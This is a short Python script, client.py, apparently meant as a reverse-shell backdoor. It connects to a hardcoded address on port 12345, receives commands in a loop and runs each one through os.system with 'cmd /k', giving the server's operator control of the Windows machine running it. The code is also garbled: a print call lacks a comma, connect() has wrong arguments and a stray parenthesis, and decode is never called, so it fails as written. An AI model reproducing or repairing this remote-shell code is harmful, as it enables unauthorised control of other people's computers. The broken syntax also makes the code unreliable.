#client.py
import socket
import os

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server = "192.168.1.16"
port = 12345

print ("Established connection to :", server ":", port)

client.connect(server, port))

while True:
    data = client.recv(1024)
    print("Executed : ", data.decode())
    os.system('cmd /k' + data.decode)
    
